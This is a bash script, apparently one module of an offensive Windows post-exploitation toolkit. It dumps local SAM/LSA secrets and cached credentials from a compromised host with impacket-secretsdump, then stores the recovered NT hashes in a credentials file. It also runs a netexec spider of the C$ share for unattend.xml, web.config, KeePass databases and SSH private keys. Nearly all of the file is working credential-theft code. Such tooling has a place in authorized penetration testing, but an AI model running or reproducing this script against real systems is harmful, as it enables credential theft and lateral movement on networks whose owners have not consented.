#!/usr/bin/env bash
# =============================================================================
#  local_creds.sh  —  local SAM/LSA dump + on-host credential file sweep (COMPOSITE)
# =============================================================================
#  Attack-chain role: on a host you already have (admin) access to, pull local
#  secrets and hunt the filesystem for stashed credentials. Composite: two
#  distinct techniques, pausing between them.
#
#  Sub-step 1: local SAM / LSA secrets dump (impacket-secretsdump against the host).
#  Sub-step 2: sweep shares for common credential-bearing files (unattend.xml,
#              web.config, sysprep, scripts/configs with plaintext passwords).
#
#  The target is the HOST you have access to (-t), NOT the domain DC.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
local_creds.sh — local SAM/LSA dump + credential-file sweep on a host (COMPOSITE)

USAGE:   ./local_creds.sh -t <host> [-d domain] [-q]
EXAMPLE: ./local_creds.sh -t 10.0.0.25

FLAGS:
  -t, --target <host>  the host you have admin access to (NOT the DC)
  -q, --quiet          no live screen output
  -h, --help           this help
  (shared flags -d/--dc-ip: --help-common)

SUB-STEPS (pauses between): (1) impacket-secretsdump local SAM/LSA/cached dump —
  recovered local NT hashes are added to creds.json (obtained_via "local SAM
  dump"); (2) netexec spider of the host's shares for unattend.xml / web.config /
  sysprep / *.config / key files — hits are listed for you to pull and inspect
  (add any real creds with add_cred.sh). Artifacts land in the loot dir.
PREREQS: a credential in creds.json with admin on the target host. netexec.
EOF
}

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
[[ "${1:-}" == "-h" || "${1:-}" == "--help" ]] && { usage; exit 0; }

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <host>"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"
DC="$TARGET"                        # point impacket/netexec at the HOST, not the DC
AUTH="$(nxc_auth)"

log_begin
announce_loot
log_info "local credential hunt on ${TARGET} as ${DOMAIN}/${SEL_USER} (${SEL_STYPE})"

# --- Sub-step 1: local SAM / LSA secrets dump -----------------------------
if pause_step "Local SAM/LSA secrets dump (impacket-secretsdump on ${TARGET})"; then
  need_cmd impacket-secretsdump
  OUTPREFIX="$(loot_dir)/local-secretsdump"
  # Remote SAM/LSA/cached dump against the host (no -just-dc: this is the local
  # hive, not the domain). Sensitive: capture → store hashes → then log.
  DUMP="impacket-secretsdump -outputfile '${OUTPREFIX}' $(imp_target) $(imp_secret_flags)"
  log_run "$DUMP"; exec_capture "$DUMP"
  count=0
  while IFS= read -r line; do
    [[ "$line" =~ ^[^:]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}::: ]] || continue
    principal="${line%%:*}"; user="${principal##*\\}"
    nt="$(printf '%s' "$line" | cut -d: -f4)"
    [[ -z "$nt" ]] && continue
    # local accounts → label the domain as the host so they're distinguishable
    creds_add "$TARGET" "$user" "ntlm_hash" "$nt" "local SAM dump ($TARGET), $(date '+%F')"
    count=$((count+1))
  done <<< "$LAST_OUTPUT"
  log_output                        # dumped hashes now tracked → redacted
  log_ok "stored ${count} local NT hash(es) from ${TARGET}"
fi

# --- Sub-step 2: filesystem sweep for credential-bearing files ------------
if pause_step "Credential-file sweep (netexec spider: unattend/web.config/sysprep/configs)"; then
  need_cmd netexec
  # Spider common shares for filenames that frequently stash plaintext creds.
  run_cmd "netexec smb ${TARGET} ${AUTH} --spider C\$ --pattern unattend.xml Autounattend.xml sysprep.inf sysprep.xml web.config .config .ps1 .kdbx .ppk id_rsa"
  log_info "review the spidered hits above; pull any interesting file and inspect it"
  log_info "config/unattend passwords are added manually — use: ./add_cred.sh -o 'config file find'"
fi

log_end "success"
